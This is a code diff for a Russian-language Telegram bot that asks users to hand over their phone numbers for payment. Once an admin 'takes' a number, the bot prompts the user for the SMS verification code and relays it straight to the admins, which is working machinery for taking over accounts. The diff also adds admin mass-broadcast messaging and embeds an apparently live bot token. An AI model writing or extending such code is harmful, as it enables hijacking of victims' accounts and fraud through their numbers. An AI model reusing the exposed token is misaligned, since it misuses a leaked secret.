@@ -12,9 +12,10 @@ from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton,
 
 # --- КОНФИГУРАЦИЯ ---
 TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw"
-ADMIN_IDS = [7323981601, 8383446699] 
+ADMIN_IDS = [7323981601] 
 CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
 CHANNEL_ID = -1003532318157
+SUPPORT_LINK = "https://t.me/ik_126"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -27,7 +28,7 @@ class Form(StatesGroup):
     choosing_tariff = State()
     entering_number = State()
     entering_code = State()
-    broadcasting = State()
+    broadcasting = State() # Состояние для рассылки
 
 # --- БАЗА ДАННЫХ ---
 async def init_db():
@@ -42,7 +43,7 @@ async def init_db():
 def main_kb():
     return ReplyKeyboardMarkup(keyboard=[
         [KeyboardButton(text="📱 Сдать номер")],
-        [KeyboardButton(text="📢 Канал/Чат")]
+        [KeyboardButton(text="📢 Канал/Чат"), KeyboardButton(text="🆘 Поддержка")]
     ], resize_keyboard=True)
 
 def tariff_kb():
@@ -79,7 +80,7 @@ async def start(message: types.Message):
             [InlineKeyboardButton(text="🔗 Вступить", url=CHANNEL_LINK)],
             [InlineKeyboardButton(text="🔄 Проверить", callback_data="check_sub_now")]
         ])
-        return await message.answer("⚠️ Подпишитесь на канал!", reply_markup=kb)
+        return await message.answer("⚠️ Подпишитесь на канал для доступа!", reply_markup=kb)
     await message.answer(f"👋 Привет! Выбирай пункт меню:", reply_markup=main_kb())
 
 @dp.callback_query(F.data == "check_sub_now")
@@ -90,17 +91,56 @@ async def check_sub_callback(callback: CallbackQuery):
     else:
         await callback.answer("❌ Вы не подписаны!", show_alert=True)
 
+@dp.message(F.text == "🆘 Поддержка")
+async def support_handler(message: types.Message):
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✍️ Написать админу", url=SUPPORT_LINK)]])
+    await message.answer("Есть вопросы? Пиши мне:", reply_markup=kb)
+
 @dp.message(Command("admin"))
 async def admin_panel(message: types.Message):
     if message.from_user.id in ADMIN_IDS:
         await message.answer(f"🛠 Админ-панель", reply_markup=admin_kb())
 
-# --- ЛОГИКА РАБОТЫ С НОМЕРОМ ---
+# --- ЛОГИКА РАССЫЛКИ (ИСПРАВЛЕНО) ---
+
+@dp.callback_query(F.data == "admin_broadcast")
+async def broadcast_command(callback: CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS: return
+    await state.set_state(Form.broadcasting)
+    await callback.message.answer("📝 **Введите текст рассылки** (можно с фото):\nДля отмены напишите 'отмена'", parse_mode="Markdown")
+    await callback.answer()
+
+@dp.message(Form.broadcasting)
+async def perform_broadcast(message: types.Message, state: FSMContext):
+    if message.from_user.id not in ADMIN_IDS: return
+    if message.text and message.text.lower() == "отмена":
+        await state.clear()
+        return await message.answer("❌ Рассылка отменена.")
+
+    async with aiosqlite.connect('bot_database.db') as db:
+        async with db.execute('SELECT user_id FROM users') as cursor:
+            users = await cursor.fetchall()
+
+    count = 0
+    await message.answer(f"⌛ Начинаю рассылку на {len(users)} пользователей...")
+    
+    for user in users:
+        try:
+            await message.copy_to(chat_id=user[0])
+            count += 1
+            await asyncio.sleep(0.05) # Защита от спам-фильтра ТГ
+        except Exception:
+            pass
+
+    await state.clear()
+    await message.answer(f"✅ Рассылка завершена!\nУспешно отправлено: {count}")
+
+# --- ЛОГИКА СДАЧИ НОМЕРА ---
 
 @dp.message(F.text == "📱 Сдать номер")
 async def rent_start(message: types.Message, state: FSMContext):
     if not WORK_STATUS:
-        return await message.answer("😴 Мы сейчас отдыхаем.")
+        return await message.answer("😴 Прием номеров временно закрыт.")
     await state.set_state(Form.choosing_tariff)
     await message.answer("💵 Выберите тариф:", reply_markup=tariff_kb())
 
@@ -115,106 +155,79 @@ async def rent_tariff(message: types.Message, state: FSMContext):
 
 @dp.message(Form.entering_number)
 async def rent_number(message: types.Message, state: FSMContext):
+    if message.text == "🔙 Назад":
+        await state.clear()
+        return await message.answer("Меню:", reply_markup=main_kb())
+        
     phone = re.sub(r'\D', '', message.text)
     if len(phone) < 7: return await message.answer("❌ Ошибка в номере.")
     data = await state.get_data()
 
     async with aiosqlite.connect('bot_database.db') as db:
-        cursor = await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', 
-                                 (message.from_user.id, phone, data['tariff']))
+        cursor = await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', (message.from_user.id, phone, data['tariff']))
         request_id = cursor.lastrowid
         await db.commit()
     
-    # Кнопки для админа: Взять или Отмена
-    admin_action_kb = InlineKeyboardMarkup(inline_keyboard=[
+    admin_kb_req = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Взять в работу", callback_data=f"take_{request_id}_{message.from_user.id}")],
         [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{request_id}_{message.from_user.id}")],
         [InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]
     ])
 
     for admin_id in ADMIN_IDS:
-        await bot.send_message(admin_id, f"🆕 **Новая заявка #{request_id}**\n📱: `{phone}`\n💰: {data['tariff']}", 
-                             parse_mode="Markdown", reply_markup=admin_action_kb)
+        await bot.send_message(admin_id, f"🆕 **Заявка #{request_id}**\n📱: `{phone}`\n💰: {data['tariff']}", parse_mode="Markdown", reply_markup=admin_kb_req)
     
     await state.clear()
-    await message.answer("⏳ **Номер отправлен!**\nПожалуйста, не закрывайте бот. Как только админ возьмет номер, я попрошу код.", reply_markup=main_kb())
+    await message.answer("⏳ **Номер отправлен!** Ожидайте, скоро админ запросит код.")
 
-# --- ОБРАБОТКА КНОПОК АДМИНА (ВЗЯТЬ / ОТМЕНА) ---
+# --- ВОРК СТАТУС / ВЗЯТИЕ В РАБОТУ ---
 
 @dp.callback_query(F.data.startswith("take_"))
-async def admin_take_number(callback: CallbackQuery, state: FSMContext):
+async def take_req(callback: CallbackQuery):
     _, req_id, user_id = callback.data.split("_")
-    
-    # Уведомляем пользователя и переводим его в режим ожидания кода
-    try:
-        # Принудительно ставим состояние пользователю через bot и FSMContext
-        user_state = dp.fsm.get_context(bot, chat_id=int(user_id), user_id=int(user_id))
-        await user_state.set_state(Form.entering_code)
-        await bot.send_message(user_id, "🔔 **Админ взял ваш номер!**\nСМС отправлено. Введите код из СМС ниже 👇", parse_mode="Markdown")
-        await callback.message.edit_text(callback.message.text + "\n\nСтатус: 🟡 **Взят в работу**")
-        await callback.answer("Пользователь уведомлен, ждем код.")
-    except Exception as e:
-        await callback.answer("Ошибка: не удалось уведомить юзера", show_alert=True)
+    user_state = dp.fsm.get_context(bot, chat_id=int(user_id), user_id=int(user_id))
+    await user_state.set_state(Form.entering_code)
+    await bot.send_message(user_id, "🔔 **Админ взял номер!**\nВведите код из СМС ниже 👇")
+    await callback.message.edit_text(callback.message.text + "\n\nСтатус: 🟡 В работе")
+    await callback.answer()
 
 @dp.callback_query(F.data.startswith("cancelreq_"))
-async def admin_cancel_request(callback: CallbackQuery):
+async def cancel_req(callback: CallbackQuery):
     _, req_id, user_id = callback.data.split("_")
     async with aiosqlite.connect('bot_database.db') as db:
         await db.execute('DELETE FROM requests WHERE id = ?', (req_id,))
         await db.commit()
-    
-    try:
-        await bot.send_message(user_id, "❌ Ваша заявка отклонена администратором.")
-        await callback.message.edit_text(callback.message.text + "\n\nСтатус: ❌ **Отклонено**")
+    try: await bot.send_message(user_id, "❌ Заявка отклонена.")
     except: pass
-    await callback.answer("Заявка отменена.")
-
-# --- ВВОД КОДА ПОЛЬЗОВАТЕЛЕМ ---
+    await callback.message.delete()
+    await callback.answer("Отменено")
 
 @dp.message(Form.entering_code)
-async def user_enters_code(message: types.Message, state: FSMContext):
-    code = message.text
+async def code_input(message: types.Message, state: FSMContext):
     async with aiosqlite.connect('bot_database.db') as db:
-        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (code, message.from_user.id))
+        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (message.text, message.from_user.id))
         await db.commit()
-
-    chat_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💬 Открыть чат", url=f"tg://user?id={message.from_user.id}")],
-        [InlineKeyboardButton(text="✅ Готово (Завершить)", callback_data="admin_close")]
-    ])
-
     for admin_id in ADMIN_IDS:
-        await bot.send_message(admin_id, f"🔑 **Пришел КОД!**\n👤 Юзер: {message.from_user.id}\n💬 Код: `{code}`", 
-                             parse_mode="Markdown", reply_markup=chat_kb)
-    
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]])
+        await bot.send_message(admin_id, f"🔑 **КОД!**\n👤 ID: `{message.from_user.id}`\n💬 Код: `{message.text}`", parse_mode="Markdown", reply_markup=kb)
     await state.clear()
-    await message.answer("✅ Код успешно передан! Ожидайте подтверждения.", reply_markup=main_kb())
-
-# --- ОСТАЛЬНЫЕ ФУНКЦИИ ---
-
-@dp.callback_query(F.data == "admin_close")
-async def admin_close(callback: CallbackQuery):
-    await callback.message.delete()
-
-@dp.callback_query(F.data == "admin_view_new")
-async def view_requests(callback: CallbackQuery):
-    async with aiosqlite.connect('bot_database.db') as db:
-        async with db.execute('SELECT id, phone, tariff, user_id FROM requests WHERE status = 0 AND code IS NULL LIMIT 1') as cursor:
-            row = await cursor.fetchone()
-    if not row: return await callback.answer("Нет новых заявок.")
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Взять", callback_data=f"take_{row[0]}_{row[3]}")],
-        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{row[0]}_{row[3]}")]
-    ])
-    await callback.message.answer(f"Заявка #{row[0]}\n📱: `{row[1]}`", reply_markup=kb, parse_mode="Markdown")
+    await message.answer("✅ Код передан!")
 
 @dp.callback_query(F.data.startswith("work_"))
 async def work_toggle(callback: CallbackQuery):
     global WORK_STATUS
     action = callback.data.split("_")[1]
     WORK_STATUS = (action == "start")
-    await callback.message.answer(f"Статус изменен на: {'РАБОТАЕМ' if WORK_STATUS else 'ОТДЫХ'}")
+    
+    # Авто-рассылка о начале/конце ворка
+    msg = "🚀 **Работаем!** Можно сдавать номера." if WORK_STATUS else "😴 **Отдыхаем!** Прием временно закрыт."
+    async with aiosqlite.connect('bot_database.db') as db:
+        async with db.execute('SELECT user_id FROM users') as cursor:
+            users = await cursor.fetchall()
+    for u in users:
+        try: await bot.send_message(u[0], msg, parse_mode="Markdown")
+        except: pass
+    await callback.answer(f"Статус: {msg}")
 
 async def main():
     await init_db()
